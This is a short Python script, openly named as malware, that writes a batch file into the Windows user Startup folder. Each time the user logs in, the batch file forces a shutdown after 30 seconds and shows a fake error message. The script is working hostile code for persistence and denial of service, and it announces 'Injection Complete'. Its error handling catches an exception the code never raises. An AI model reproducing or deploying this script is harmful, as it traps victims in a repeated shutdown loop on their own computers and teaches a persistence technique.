#Imports
import os

#Global variables

appdata = os.getenv('APPDATA')

#Functions

def create_malware_file():
    directory = appdata+'\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
    with open(directory+"run.bat",'w') as malware:
        malware.write('shutdown.exe -s -t 30 -c "Your computer has run into an error"')
    
#Void Main
while True:
    try:
        print('\n>>>Starting Injection ...')
        create_malware_file()
        print('[+]Injection Complete .')
        break
    except FileExistsError:
        print('The Folder Already Exists Please specify another filename')